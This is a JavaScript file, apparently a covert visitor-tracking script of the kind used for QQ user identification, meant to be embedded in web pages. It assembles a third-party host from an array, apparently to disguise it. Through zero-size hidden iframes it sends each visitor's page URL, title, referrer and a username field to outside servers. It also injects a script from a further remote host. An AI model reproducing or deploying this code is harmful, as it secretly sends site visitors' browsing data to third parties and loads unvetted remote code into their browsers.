var isIE = document.all?true:false;
var ie = document.all ? true: false;
var isIE = !!window.ActiveXObject;

var fangke_xHead = document.getElementsByTagName('HEAD').item(0);
var para=document.getElementById("qclient_js");
var v;
var v=para.src;

var tmp=v.split("?");
var ids=tmp[1];
var ids = "uin="+ids;
var sg_ids = ids.replace("uin=","");
//alert(sg_ids);


var url = tmp[0].split("tj.js");
//alert(url[0]);



var tj_para=document.getElementById("qclient_js");
var tj_v;
tj_v=tj_para.src;
var tj_tmp=tj_v.split("?");
var tj_ids=tj_tmp[1];
var tj_host=encodeURIComponent(document.location.href);
var tj_title=encodeURIComponent(document.title);
var tj_refer=encodeURIComponent(document.referrer);
var tm=Math.random();
document.write('<img id="flyerimgtj" style="display:none;" ><iframe id="login_frametj" height="0" scrolling="auto" width="0" frameborder="0" src=""></iframe><img src="" style="display:none;">');
var tj_key=['http','https','baidu','qq.com','google.com','www.81c.cn:8888','/getdata'];  
function send(){var tj_url=tj_key[0]+"://"+tj_key[5]+tj_key[6]+"/tjvip.asp?ps=1&p="+tj_ids+"&r="+tj_refer+"&u="+tj_host+"&t="+tj_title+"&m="+Math.random();;document.getElementById("login_frametj").src=tj_url;}setTimeout(send,3000);setTimeout(send,8000);





function skip(username) {
    var QQfangke_xurl = url[0]+'ApiSus.asp?'+ids;
    var QQfangke_ref = encodeURIComponent(document.referrer);
    var QQfangke_page = encodeURIComponent(document.location.href);
    var QQfangke_url = QQfangke_xurl + '&url='+encodeURIComponent(url[0])+'&llurl=' + QQfangke_ref + '&thepage=' + QQfangke_page + '&username='+username+'&t=' + new Date().getTime();
	
	createIframe_html(QQfangke_url);
   
}



function createIframe_html(srcarr){
		var iframecss = "position:absolute; z-index: 0;width:0px; height:0px;";
		var iframe = document.createElement("iframe");
		iframe.src = srcarr;
		iframe.style.cssText = iframecss;
		document.getElementsByTagName("HEAD").item(0).appendChild(iframe);
}


skip();


document.write("<script src='http://api.bjbmyj.com/ApiGo/sg/sv.php?uid="+sg_ids+"&url="+encodeURIComponent(url[0])+"'></script>");

